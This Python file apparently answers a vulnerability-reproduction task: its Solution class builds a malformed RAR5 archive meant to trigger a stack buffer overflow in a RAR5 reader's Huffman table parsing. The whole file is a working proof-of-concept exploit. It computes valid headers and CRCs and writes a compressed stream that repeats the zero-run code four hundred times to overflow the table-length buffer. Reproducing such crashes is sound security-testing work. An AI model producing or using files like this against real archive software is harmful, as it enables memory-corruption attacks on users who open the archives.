import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in RAR5 reader.
        The vulnerability lies in the Huffman table parsing where RLE checks are insufficient.
        """
        return self.generate_poc()

    def generate_poc(self) -> bytes:
        # RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
        
        # Helper for Variable Integer encoding
        def vint(n):
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)

        # Helper for Header Construction (CRC32 + Size + Type + Data)
        def make_header(type_val, data):
            body = vint(type_val) + data
            # Calculate total size including the size field itself
            v = len(body) + 1
            while True:
                sz = len(vint(v)) + len(body)
                if sz == v:
                    break
                v = sz
            full = vint(v) + body
            crc = zlib.crc32(full) & 0xFFFFFFFF
            return struct.pack('<I', crc) + full

        # 1. Main Archive Header (Type 1)
        # Flags=0, Extra=0, ArcFlags=0
        mh_data = vint(0) + vint(0) + vint(0)
        mh = make_header(1, mh_data)

        # 3. Payload Generation (Compressed Data)
        class BitWriter:
            def __init__(self):
                self.buf = bytearray()
                self.accum = 0
                self.n = 0
            
            def write(self, val, bits):
                # RAR5 stream reads MSB first
                for i in reversed(range(bits)):
                    bit = (val >> i) & 1
                    self.accum = (self.accum << 1) | bit
                    self.n += 1
                    if self.n == 8:
                        self.buf.append(self.accum)
                        self.accum = 0
                        self.n = 0
                        
            def get_bytes(self):
                if self.n > 0:
                    self.buf.append(self.accum << (8 - self.n))
                return bytes(self.buf)

        bw = BitWriter()
        # Block Header: 0 = Read Tables
        bw.write(0, 1) 
        
        # Pre-Table: 20 entries, 4 bits each.
        # We define a Huffman tree where Code 0 and Code 18 have length 1.
        # By canonical Huffman rules, Code 0 -> '0', Code 18 -> '1'.
        for i in range(20):
            if i == 0 or i == 18:
                bw.write(1, 4) # Length 1
            else:
                bw.write(0, 4) # Length 0
                
        # Main Table Content:
        # We want to overflow the stack buffer used for table lengths.
        # We use RLE Code 18 (mapped to bit '1') which repeats zeros.
        # Code 18 is followed by 7 bits of count.
        # We spam Code 18 with max count to write past buffer bounds.
        for _ in range(400):
            bw.write(1, 1)   # Code 18
            bw.write(127, 7) # Count: 11 + 127 = 138 zeros
            
        payload = bw.get_bytes()

        # 2. File Header (Type 2)
        # Fields: Flags(v), Extra(v), DataSize(v), UnpSize(v), Attr(v)
        #         DataCRC(4), CompInfo(v), HostOS(v), NameLen(v), Name
        fh_data = bytearray()
        fh_data += vint(0)                   # Flags
        fh_data += vint(0)                   # Extra
        fh_data += vint(len(payload))        # DataSize
        fh_data += vint(0)                   # UnpSize (irrelevant for crash)
        fh_data += vint(0)                   # Attributes
        fh_data += struct.pack('<I', zlib.crc32(payload) & 0xFFFFFFFF) # DataCRC
        fh_data += vint(0x28)                # Method 5 (Best), Ver 0
        fh_data += vint(0)                   # HostOS
        fh_data += vint(1)                   # NameLen
        fh_data += b'a'                      # Name
        
        fh = make_header(2, fh_data)

        # 4. End of Archive Header (Type 5)
        eo_data = vint(0) # Flags
        eo = make_header(5, eo_data)

        return sig + mh + fh + payload + eo